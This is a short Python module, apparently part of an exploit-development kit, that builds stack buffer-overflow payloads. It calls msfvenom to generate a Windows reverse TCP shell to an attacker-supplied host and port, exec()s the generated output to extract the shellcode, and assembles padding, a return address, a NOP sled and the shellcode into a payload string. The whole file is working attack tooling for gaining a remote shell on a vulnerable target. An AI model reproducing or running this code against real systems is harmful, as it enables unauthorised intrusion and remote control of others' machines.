import subprocess
from setup_exploit import MissingMSFModule


def generate_shellcode(ip_port: tuple, bad_chars: str) -> str:
    try:
        shell_code = subprocess.check_output(
            [f"msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={ip_port[0]}", f"LPORT={ip_port[1]}", "-b", f'{bad_chars}', "EXEC=thread", "-f", "python"]).decode('latin1')
        exec(shell_code)
        exec("shell_code = buf")
        return shell_code

    except FileNotFoundError:
        raise MissingMSFModule("msfvenom was not found")


def exploit_buffer(shell_code: str, returnAddr: str, prefix: str = "", offset: int = 0) -> str:
    payload = prefix + " " + "A" * offset + \
        "\\"+returnAddr + "\x90"*16 + shell_code + "C"*16
    print("last payload size: ", len(payload))
    print(payload)
    return payload
